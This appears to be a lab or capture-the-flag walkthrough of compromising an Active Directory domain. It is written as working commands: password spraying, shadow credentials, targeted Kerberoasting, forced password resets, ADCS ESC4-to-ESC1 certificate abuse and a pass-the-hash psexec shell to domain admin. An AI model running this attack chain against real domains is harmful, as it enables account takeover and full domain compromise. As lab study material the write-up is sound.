no initial creds.
Bank page has a few users, and an exe file, which strings show to contain a base64 string
decoding shows an md5 hash
cracking it, shows the password `Password123!!`
spraying the password shows it belongs to karl.hackermann
no winrm, rdp, no interesting shares on smb, no vuln certs
bloodhound shows the following relation
```txt
karl.hackerman --GenericWrite→ tom.reboot 
tom.reboot --ForceChangePassword→ Robert.Graef 
Robert.Graef--ForceChangePassword→ melanie.kunz, jan.tresor, nina.inkasso
```
So the strategy would be to own each users, and check for vuln certs to them, as each user is a member of dcom, and has an "enroll" relation over a bunch of certs, including what appears to be dc cert.

```zsh
certipy-ad shadow auto -username karl.hackermann@404finance.local -password 'Password123!!' -account tom.reboot -dc-ip 10.1.15.226 -debug -dc-host 10.1.15.226
#gives NT hash
#OR
python /opt/targetedKerberoast/targetedKerberoast.py -v -d '404finance.local' -u 'karl.hackermann' -p 'Password123!!'
#gives kerb hash
#P@ssw0rd123
bloodyAD --host 10.1.15.226 -d 404finance.local -u tom.reboot -p 'P@ssw0rd123' set password 'robert.graef' 'newPassword1!'
bloodyAD --host 10.1.15.226 -d 404finance.local -u robert.graef -p 'newPassword1!' set password 'melanie.kunz' 'newPassword1!'

#strangely, none of them had any vuln certs
#so we spray everyone everywhere
for pro in rdp winrm wmi mssql; do for line in $(tail -n5 creds.txt);do nxc $pro 10.1.15.226 -u $(echo $line | awk -F':' '{print $1}') -p $(echo $line | awk -F':' '{print $2}');done ;done

#We failed to see robert.graef has the ability to add people to `Remote Desktop Users` 
#we can use this to gain shell

net rpc group addmem "Remote Desktop Users" "melanie.kunz" -U '404finance.local'/'robert.graef'%'newPassword1!' -S "10.1.15.226"
OR
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TargetGroup" "$TargetUser"
#Once we go in as melanie, we see, jan.tresor already has a profile under \users. So we add jan to rd users ad rd as her
#we do, and find a mail file in her recycle bin, restore it, and find out password for daniel.hoffmann
#we also see daniel.hoffmann has forceChangePassword on webadmin
certipy-ad find -u 'webadmin' -p 'newPassword1!' -dc-ip 10.1.15.226 -stdout -vulnerable -debug

#and we add webadmin to the rd users
bloodyAD --host "10.1.15.226" -d "404finance.local" -u "robert.graef" -p 'newPassword1!' add groupMember "Remote Desktop Users" "webadmin"

#in \inetpub\wwwroot\port50000, we find a config.zip
#exfiltrate to find out password-protected, not crackable by rockyou
cewl http://404finance.local/history.html > lc2.txt
#this wordlists cracks password, and we find creds for svc.services
#This account is disabled. but we remember robert.graef can enable this user 

bloodyAD --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'newPassword1!' remove uac 'svc.services' -f ACCOUNTDISABLE

#now, we look for vuln cert
certipy-ad find -u 'svc.services@404finance.local' -p 'S3rv1cePower2024!' -dc-ip 10.1.15.226 -stdout -vulnerable -debug
#we find esc4
#convert it to esc1
certipy-ad template -u 'svc.services' -p 'S3rv1cePower2024!' -dc-ip 10.1.15.226 -template 'Vuln-ESC4' -write-default-configuration

certipy-ad req -u svc.services -p 'S3rv1cePower2024!' -dc-ip 10.1.15.226 -ca '404finance-DC-404-CA' -template 'Vuln-ESC4' -upn administrator@404finance.local

certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.15.226

impacket-psexec administrator@10.1.15.226 :a6019e48da8f602a60c30a6f0136d792
```